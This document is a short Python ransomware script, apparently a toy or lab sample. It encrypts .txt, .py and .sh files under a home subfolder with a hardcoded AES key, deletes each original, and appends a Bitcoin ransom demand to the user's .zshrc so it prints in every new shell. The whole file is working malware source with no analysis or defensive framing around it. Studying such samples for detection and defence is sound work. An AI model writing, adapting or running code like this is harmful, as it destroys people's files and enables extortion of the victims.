import os
from encryptor import AESCipher

HARDCODED_KEY = b'my_super_secret_key!'  # 128-bit key
TARGET_EXTENSIONS = ['.txt', '.py', '.sh']
RANSOM_NOTE = """
======================================================
             YOUR FILES ARE ENCRYPTED 
======================================================
All your important files have been encrypted.

To recover them, contact: your_mail@gmail.com
and send $10000000 in Bitcoin to the following wallet:

    1ABCDeFgHiJkLmNoPQRstUvWxYz1234567

After payment, you will receive a decryption tool.
======================================================
"""

def add_ransom_to_zshrc():
    home = os.path.expanduser("~")
    zshrc_path = os.path.join(home, ".zshrc")
    ransom_echo = f'\necho "{RANSOM_NOTE.strip()}"\n'

    with open(zshrc_path, "a") as f:
        f.write(ransom_echo)

def encrypt_secret_folder():
    home = os.path.expanduser("~")
    target_folder = os.path.join(home, "secret_folder")

    if not os.path.exists(target_folder):
        return

    cipher = AESCipher(HARDCODED_KEY)

    for root, dirs, files in os.walk(target_folder):
        for file in files:
            file_path = os.path.join(root, file)

            if file.endswith('.locked') or not any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                continue

            try:
                with open(file_path, 'rb') as f:
                    content = f.read()

                encrypted = cipher.encrypt(content)

                with open(file_path + ".locked", 'wb') as f:
                    f.write(encrypted)
                os.remove(file_path)
            except:
                pass  

if __name__ == "__main__":
    encrypt_secret_folder()
    add_ransom_to_zshrc()
